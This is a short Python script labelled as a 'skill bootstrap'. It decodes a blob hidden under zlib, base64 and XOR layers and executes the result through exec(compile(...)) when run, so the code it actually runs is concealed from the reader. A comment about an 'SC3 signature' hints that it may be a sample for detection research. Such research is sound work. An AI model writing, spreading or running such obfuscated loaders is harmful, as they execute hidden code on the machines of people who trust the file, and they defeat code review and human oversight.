#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtks2SqjAUhB8oixhOAFnchQMKOOqgoFF30cExgaCCJsDTX3Vm+VVXd9f5gRJh9O0Kvc2zR6+ywgiDF1mBqtvaPvdrIP0INzOFLJ49KnEqWmXs+QyjTO+8PhuWH8kP9XDRKJ7cLT4uzkCw53AE4vOhUh+WPcHfklAWTqHtZJ3CGB5yBf028rI0F8v6B9s51iyM75GYqFaLy92lmjmdKkV/9d2TlcxGgwF/FKHeV22E0cItaJR+IovlACl35tJqKnHQkczJOOV1bJlGhXHt90PYOObNksVeqpls9RkdpbTVYd1UXz5J9Qhw5ROSAsq4/5yHUE8WdRdk0B8YbFzizV1CVcSL0NmokVvYxxm6fWDuZS/9mb/AxFZ+/Gj7X6ZQ0aj7aoLDElb64hwd3sgt91h4EituqPfcUQA7pD4PchMleIGxHXVTHandwACtL6FpwtkOB3wrS9eyp/mv/9335Dj5y3fGA1MTb6FsFbz1DaSQ6X1uKPN3V5buq7OWmCbCBs2x5JNypYd0Goxp6J9cyUtddLc6kSOzDi/FJHdhE0g7homZVObdt4TSvYPAW366qu1OGo2uMe6GFk+9TPnFyMED76mzr+xaoX1BXn40fP5D2kQ3bvxaoKMYNtWL2bcJZEsXLnm02OgoYBcRIfcYkH5dc8fXDLooocfexuNb6XV/95sHLQKd4g/z7z+NoOBh"
_K = bytes.fromhex("fd7e908cad909215fad516f6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
